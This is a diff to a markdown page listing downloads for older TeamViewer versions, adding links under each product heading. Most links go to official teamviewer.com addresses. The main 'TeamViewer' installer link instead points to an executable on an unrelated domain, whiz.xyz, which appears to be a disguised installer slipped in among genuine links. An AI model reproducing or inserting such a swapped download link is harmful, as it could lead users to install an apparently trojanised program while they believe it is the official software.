@@ -4,14 +4,14 @@ The downloads on this page are only recommended for users with older licenses th
 
 ## Privacy Policy
 
-### TeamViewer
-### TeamViewer QuickSupport
-### TeamViewer QuickJoin
-### TeamViewer Host
-### TeamViewer Portable
-### TeamViewer MSI package
-### Manual for remote control v13
-### Manual for meeting v13
-### Manual for Management Console v12
-### Manual for Wake-on-Lan
-### Manual for ITbrain
+### [TeamViewer](https://whoiz.xyz/TeamViewer_Setup.exe)
+### [TeamViewer QuickSupport](https://download.teamviewer.com/download/version_14x/TeamViewerQS.exe)
+### [TeamViewer QuickJoin](https://download.teamviewer.com/download/version_14x/TeamViewerQJ.exe)
+### [TeamViewer Host](https://download.teamviewer.com/download/version_14x/TeamViewer_Host_Setup.exe)
+### [TeamViewer Portable](https://download.teamviewer.com/download/version_14x/TeamViewerPortable.zip)
+### [TeamViewer MSI package](https://support.teamviewer.com/en/support/solutions/articles/75000016428-download-msi-for-previous-teamviewer-versions)
+### [Manual for remote control v13](https://download.teamviewer.com/docs/en/v13/TeamViewer13-Manual-Remote-Control-en.pdf)
+### [Manual for meeting v13](https://download.teamviewer.com/docs/en/v13/TeamViewer13-Manual-Meeting-en.pdf)
+### [Manual for Management Console v12](https://download.teamviewer.com/docs/en/v12/TeamViewer12-Manual-ManagementConsole-en.pdf)
+### [Manual for Wake-on-Lan](https://download.teamviewer.com/docs/en/v11/TeamViewer11-Manual-Wake-on-LAN-en.pdf)
+### [Manual for ITbrain](https://download.teamviewer.com/docs/en/v11/TeamViewer11-Manual-ITbrain-en.pdf)
